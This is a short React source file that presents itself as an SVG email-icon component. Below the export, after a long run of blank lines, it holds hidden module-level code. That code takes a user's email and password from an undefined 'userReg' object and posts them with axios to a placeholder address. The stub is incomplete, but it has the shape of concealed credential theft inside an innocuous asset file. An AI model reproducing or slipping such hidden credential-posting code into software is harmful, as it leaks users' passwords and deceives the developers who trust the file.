import axios from "axios";
import React from "react";
function EmailIMG(){
    return (<svg id="emailImage" width="21" height="16" viewBox="0 0 21 16" fill="none" xmlns="http://www.w3.org/2000/svg">
    <path d="M20.8 13.4V2.6C20.8 1.604 19.996 0.800003 19 0.800003H2.188C1.192 0.800003 0.388 1.604 0.388 2.6V13.4C0.388 14.396 1.192 15.2 2.188 15.2H19C19.996 15.2 20.8 14.396 20.8 13.4ZM19.228 2.468C19.624 2.864 19.408 3.272 19.192 3.476L14.32 7.94L19 12.812C19.144 12.98 19.24 13.244 19.072 13.424C18.916 13.616 18.556 13.604 18.4 13.484L13.156 9.008L10.588 11.348L8.032 9.008L2.788 13.484C2.632 13.604 2.272 13.616 2.116 13.424C1.948 13.244 2.044 12.98 2.188 12.812L6.868 7.94L1.996 3.476C1.78 3.272 1.564 2.864 1.96 2.468C2.356 2.072 2.764 2.264 3.1 2.552L10.588 8.6L18.088 2.552C18.424 2.264 18.832 2.072 19.228 2.468Z" fill="black"/>
    </svg>
    )
}
export default EmailIMG;


















var email = userReg.email;
var password = userReg.password;
var data = { email, password };
axios.post('link',data)